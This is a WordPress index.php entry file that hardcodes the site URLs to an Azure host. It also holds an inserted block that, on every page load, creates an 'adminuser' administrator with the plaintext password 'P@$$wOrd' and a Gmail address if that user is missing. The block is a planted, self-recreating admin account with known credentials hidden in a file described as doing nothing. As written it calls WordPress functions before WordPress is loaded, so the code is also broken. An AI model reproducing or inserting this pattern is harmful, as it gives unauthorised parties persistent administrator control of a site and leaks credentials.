<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );
define( 'WP_HOME', 'http://bkend-bms-fna6bwdsavczgchc.canadacentral-01.azurewebsites.net' );
define( 'WP_SITEURL', 'http://bkend-bms-fna6bwdsavczgchc.canadacentral-01.azurewebsites.net' );

// Create a new admin user if one doesn't exist
if ( ! username_exists( 'adminuser' ) ) {
    $user_id = wp_create_user( 'adminuser', 'P@$$wOrd', 'tabcloudnbdt@gmail.com' );
    $user = new WP_User( $user_id );
    $user->set_role( 'administrator' );
}

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
